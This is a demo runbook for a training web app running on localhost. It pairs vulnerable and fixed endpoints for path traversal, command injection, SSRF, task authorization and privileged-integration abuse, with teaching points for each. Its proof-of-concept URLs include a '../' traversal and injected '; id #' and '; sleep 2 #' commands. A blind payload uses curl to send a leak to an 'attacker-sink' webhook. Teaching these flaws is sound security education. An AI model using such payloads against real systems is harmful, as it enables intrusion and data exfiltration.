# Part 2 Demo Runbook

## Setup

Use the same setup as Part 1:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
python manage.py migrate
python manage.py seed_demo_data
python manage.py runserver
```

Open:

```text
http://127.0.0.1:8000/part2/integration/
```

## Path Traversal / Unsafe File Access

Normal file read:

```text
http://127.0.0.1:8000/part2/files/vulnerable/?name=alice-summary.txt
```

PoC:

```text
http://127.0.0.1:8000/part2/files/vulnerable/?name=../private/internal-note.txt
```

Fixed:

```text
http://127.0.0.1:8000/part2/files/fixed/?report=alice-summary
```

Expected teaching point:

> Users choose resources, not filesystem paths.

## Unsafe Subprocess Usage

Normal diagnostics:

```text
http://127.0.0.1:8000/part2/subprocess/vulnerable/?target=api
```

PoC:

```text
http://127.0.0.1:8000/part2/subprocess/vulnerable/?target=api%3B%20id%20%23
```

Fixed:

```text
http://127.0.0.1:8000/part2/subprocess/fixed/?target=api%3B%20id%20%23
```

Expected teaching point:

> Treat command execution as a privilege boundary.

Blind callback PoC:

```text
http://127.0.0.1:8000/part2/subprocess/blind/?target=api%3B%20curl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fpart2%2Fwebhooks%2Fattacker-sink%2F%3Fsource%3Dblind-rce%5C%26leak%3Ddemo%20%23
```

View received webhook events:

```text
http://127.0.0.1:8000/part2/webhooks/events/
```

Blind timing PoC:

```bash
time curl -sS 'http://127.0.0.1:8000/part2/subprocess/blind/?target=api%3B%20sleep%202%20%23'
```

Expected teaching flow:

1. First show visible command output with `id`.
2. Then show a blind endpoint that returns no command output but calls a webhook.
3. Then show a blind endpoint where execution is proven by response delay.

## Unsafe Outbound Fetch / Webhook Validation

Normal fetch:

```text
http://127.0.0.1:8000/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/public-api/
```

PoC:

```text
http://127.0.0.1:8000/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/
```

Fixed:

```text
http://127.0.0.1:8000/part2/fetch/fixed/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/
```

Expected teaching point:

> A URL fetch is not just input validation; it is network delegation.


## Unsafe Background Job / Task Parameters

Normal task:

```text
http://127.0.0.1:8000/part2/tasks/vulnerable/?action=export&document_id=1
```

PoC:

```text
http://127.0.0.1:8000/part2/tasks/vulnerable/?action=email_owner&document_id=2
```

Fixed:

```text
http://127.0.0.1:8000/part2/tasks/fixed/?action=email_owner
```

Expected teaching point:

> Background work still needs authorization-aware inputs.

## Unsafe Privileged Integration

Normal privileged action:

```text
http://127.0.0.1:8000/part2/privileged/vulnerable/?user=alice&target_user=alice&action=restart
```

PoC:

```text
http://127.0.0.1:8000/part2/privileged/vulnerable/?user=alice&target_user=bob&action=snapshot
```

Fixed:

```text
http://127.0.0.1:8000/part2/privileged/fixed/?user=alice&action=snapshot
```

Expected teaching point:

> Do not let users freely steer privileged backend integrations.
